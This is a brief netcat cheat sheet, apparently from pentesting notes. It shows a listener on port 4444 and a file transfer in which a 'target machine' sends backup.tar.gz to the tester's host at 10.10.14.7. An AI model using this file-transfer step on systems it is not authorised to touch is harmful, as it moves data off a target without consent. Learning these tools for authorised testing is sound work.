# Netcat

Netcat is a simple Unix utility which reads and writes data across network connections, using the TCP/IP protocol.

## Listen on a port

```bash
nc -lvpn 4444
```

## Transfer files

On your machine:
```bash
nc -lvnp 1337 > backup.tar.gz
```

On the target machine:
```bash
nc 10.10.14.7 1337 < backup.tar.gz
```
